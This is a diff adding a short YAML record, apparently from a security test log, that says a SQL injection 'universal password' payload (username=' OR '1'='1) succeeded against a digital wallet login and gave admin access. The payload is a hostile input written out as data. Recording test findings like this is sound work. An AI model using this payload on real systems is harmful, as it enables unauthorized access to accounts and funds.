@@ -1,0 +1,8 @@
+category: sqli
+date: '2026-07-20'
+detail: 登录为 admin (id:6, balance:999999.99, role:admin)
+id: 万能密码-sqli-(username='-or-'1'='1)
+name: 万能密码 SQLi (username=' OR '1'='1)
+result: success
+source_case: 20260720-digital-wallet-sqli-idor
+tool: ''
